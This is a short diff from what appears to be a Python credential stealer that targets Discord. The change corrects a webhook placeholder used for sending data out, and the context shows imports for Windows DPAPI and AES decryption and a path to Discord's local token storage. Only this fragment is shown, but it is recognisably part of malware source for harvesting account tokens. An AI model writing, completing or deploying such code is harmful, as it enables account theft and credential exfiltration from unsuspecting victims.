@@ -7,7 +7,7 @@ import win32crypt
 import datetime
 from Crypto.Cipher import AES
 
-hk = "%WEBHOOk%"
+hk = "%WEBHOOK%"
 
 PATHS = {
     "Discord": os.path.join(os.getenv("APPDATA"), "Discord", "Local Storage", "leveldb"),
